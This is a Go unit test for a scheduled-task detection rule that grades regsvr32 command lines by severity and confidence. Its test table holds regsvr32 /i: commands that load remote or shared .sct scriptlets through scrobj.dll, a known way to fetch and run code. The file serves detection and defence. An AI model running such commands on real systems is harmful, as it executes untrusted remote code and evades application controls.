package detect

import (
	"testing"
	"tracefall/internal/model"
)

func TestReviewRegsvrQuotedInstallTarget(t *testing.T) {
	for _, tt := range []struct{ cmd, severity, confidence string }{
		{`regsvr32.exe /s /n /u /i:"https://203.0.113.8/a.sct" scrobj.dll`, "high", "medium"},
		{`regsvr32.exe /i:"\\host01\share\a.sct" scrobj.dll`, "high", "medium"},
		{`regsvr32.exe /i:"C:\Temp\a.sct" scrobj.dll`, "medium", "low"},
		{`regsvr32.exe /i:"C:\Tools\a.sct" scrobj.dll`, "", ""},
		{`regsvr32.exe /i:"https://203.0.113.8/data" C:\Tools\audit.dll`, "", ""},
		{`regsvr32.exe /i:"\https://203.0.113.8/data" scrobj.dll`, "", ""},
		{`regsvr32.exe /i:local C:\Tools\scrobj.dll "https://203.0.113.8/data"`, "", ""},
	} {
		t.Run(tt.cmd, func(t *testing.T) {
			fs := (newScheduledTask{}).Evaluate([]model.Event{taskEvent("e", "ActionReview", "alice", tt.cmd, "regsvr32.exe")})
			if tt.severity == "" {
				if !contextOnlyTaskFindings(fs) {
					t.Fatalf("data activated: %+v", fs)
				}
				return
			}
			if len(fs) != 1 || fs[0].Severity != tt.severity || fs[0].Confidence != tt.confidence {
				t.Fatalf("quoted install target lost: %+v", fs)
			}
		})
	}
}
